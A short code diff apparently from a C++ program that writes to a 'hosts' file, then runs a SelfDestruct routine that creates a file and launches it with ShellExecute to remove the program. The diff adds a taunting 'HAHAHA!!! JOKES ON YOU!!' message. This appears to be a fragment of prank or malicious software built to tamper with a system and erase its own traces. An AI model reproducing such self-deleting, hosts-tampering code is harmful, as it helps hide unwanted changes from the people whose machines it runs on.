@@ -49,7 +49,7 @@ int main()
 		CLog::WriteError("ERROR: FAILED TO OPEN :(", hosts.c_str());
 #endif
 	SelfDestruct();
-	system("pause");
+	
 
 	return 0;
 }
@@ -77,4 +77,7 @@ void SelfDestruct() {
 	fclose(fp);
 
 	ShellExecute(NULL, "open", killer, NULL, NULL, 0);
+
+	printf("\nHAHAHA!!! JOKES ON YOU!!\n");
+	Sleep(2000);
 }
